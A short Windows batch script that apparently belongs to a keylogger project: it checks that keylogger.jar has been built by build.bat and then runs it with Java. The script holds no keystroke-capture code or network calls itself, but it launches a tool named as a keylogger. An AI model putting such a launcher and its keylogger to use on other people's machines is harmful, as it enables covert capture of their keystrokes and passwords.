@echo off
:: Run KeyLogger (after running build.bat once)
if not exist keylogger.jar (
    echo keylogger.jar not found -- run build.bat first.
    pause & exit /b 1
)
java -jar keylogger.jar
